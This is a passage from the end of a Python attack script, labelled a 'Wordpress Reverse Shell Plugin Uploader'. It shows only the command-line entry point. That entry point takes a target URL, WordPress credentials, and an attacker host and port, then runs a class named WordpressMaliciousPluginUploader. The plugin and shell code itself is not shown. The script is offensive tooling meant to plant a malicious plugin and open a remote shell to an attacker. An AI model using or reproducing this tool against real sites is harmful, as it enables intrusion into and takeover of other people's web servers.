...
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Wordpress Reverse Shell Plugin Uploader')
    parser.add_argument("url", help='Wordpress target url [https://localhost/wp]')
    parser.add_argument('-u', "--username", help='Wordpress Username', required=True)
    parser.add_argument('-p', "--password", help='Wordpress Password', required=True)
    parser.add_argument('-H', "--host", help='Attacker Host', required=True)
    parser.add_argument('-P', "--port", help='Attacker Port', required=True)
    parser.add_argument("-k", help='Disable SSL/TLS Check', action="store_false", default=True)
    args = parser.parse_args()
    program = WordpressMaliciousPluginUploader(args.url, args.username, args.password, args.host, args.port, args.k)
    program.main()
